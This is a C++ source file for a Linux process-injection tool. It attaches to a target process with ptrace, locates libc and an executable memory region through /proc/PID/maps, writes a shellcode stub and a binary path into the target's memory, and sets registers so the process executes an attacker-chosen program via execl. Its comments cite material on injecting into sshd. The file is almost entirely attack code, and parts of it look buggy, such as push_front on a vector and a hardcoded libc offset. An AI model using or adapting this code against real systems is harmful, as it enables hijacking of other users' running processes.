// a simple program image loader based off:
// https://papers.vx-underground.org/papers/VXUG/Mirrors/Injection/linux/blog.xpnsec.com-Linux%20ptrace%20introduction%20AKA%20injecting%20into%20sshd%20for%20fun.pdf
// https://github.com/gaffe23/linux-inject/blob/master/utils.c
//
// usage: ./inject TARGET_PID TARGET_BINARY
//
// TODO: add option for custom libc.so or auto detection
// TODO: eventually make this ptraceless using /proc/mem
// TODO: clean up and create class for ropchain

#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>
#include <cstdlib>
#include <iostream>
#include <string>
#include <cstring>
#include <utility>
#include <vector>

#define EXECL_OFF 0xE6680

class ropchain {
    public:
        std::vector<std::pair<void *, size_t>> chain_v;
        void push(void *gadget, size_t len) {
            // TODO: ensure alignment
            chain_v.push_front(std::make_pair(gadget, len));
        }
};

uintptr_t get_free_addr(pid_t pid) {
    // return addr of first chunk with x perms
    // ? return any addr doesnt need to have x perms
    char fname[30];
    sprintf(fname, "/proc/%li/maps", (long) pid);
    FILE *fp = fopen(fname, "r");

    if (!fp) {
        std::cout << "pid doesnt exist lol\n";
        exit(-1);
    }

    char chunk[850]; // ex: 5646750f1000-564675135000 r-xp
    uintptr_t free_addr;
    char is_exec;
    while (fgets(chunk, 850, fp)) {
        sscanf(chunk, "%lx-%*lx %*c%*c%c%*c %*d", &free_addr, &is_exec);
        if (is_exec == 'x') {
            break;
        }
    }

    fclose(fp);
    return free_addr;
}

uintptr_t get_libc_base(pid_t pid) {
    // return libc base addr
    char fname[30];
    sprintf(fname, "/proc/%li/maps", (long) pid);
    FILE *fp = fopen(fname, "r");

    if (!fp) {
        std::cout << "pid doesnt exist lol\n";
        exit(-1);
    }

    char chunk[850];
    uintptr_t libc_base;
    while (fgets(chunk, 850, fp)) {
        sscanf(chunk, "%lx-%*lx %*c%*c%*c %*d", &libc_base);
        if (strstr(chunk, "libc-2.31.so")) {
            break;
        }
    }

    fclose(fp);
    return libc_base;
}

void ptrace_mem_write(pid_t pid, uintptr_t addr, void *data, int len) {
    long curr = 0;
    for (int i = 0; i < len; i += sizeof(long)) {
        if (data) {
            memcpy(&curr, data + i, sizeof(long));
        }
        else {
            curr = 0;
        }
        ptrace(PTRACE_POKETEXT, pid, addr + i, curr);
        curr = 0;
    }
}

void ptrace_write_ropchain(pid_t pid, uintptr_t dest, ropchain chain) {
    uintptr_t off = 0;
    for (std::pair<void *, size_t> &gadget: chain.chain_v) {
        ptrace_mem_write(pid, dest + off, gadget.first, gadget.second);
        off +=  gadget.second;
    }
}

// TODO: find some way to get this as an object dynamically without a JIT
void shellcode() {
    asm("call *%rax \n");
}
void shellcode_end() {

}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        std::cout << "invalid number of arguments\n";
        exit(-1);
    }

    pid_t target_pid = (pid_t) atoi(argv[1]);
    char *target_binary = argv[2];

    // parse /proc/pid/maps to get needed addrs
    uintptr_t execl_addr = get_libc_base(target_pid) + EXECL_OFF;
    uintptr_t rop_chain_addr = get_free_addr(target_pid);

    // inject shellcode with setregs and write path to target binary to target procs mem
    // eip: execl address
    // rdi: addr of path
    // rsi: NULL (0)
    // rdx: NULL (0)

    uintptr_t shellcode_size = (uintptr_t) shellcode_end - (uintptr_t) shellcode;

    struct user_regs_struct regs;
    regs.rip = rop_chain_addr;
    regs.rax = execl_addr;
    regs.rdi = rop_chain_addr + shellcode_size;
    regs.rsi = 0;
    regs.rdx = 0;

    ropchain chain;
    chain.push(shellcode, shellcode_size);
    chain.push(target_binary, strlen(target_binary));

    ptrace(PTRACE_ATTACH, target_pid, NULL, NULL);
    waitpid(target_pid, NULL, 0);

    ptrace_write_ropchain(target_pid, rop_chain_addr, chain);

    ptrace(PTRACE_SETREGS, target_pid, NULL, &regs);
    ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
}
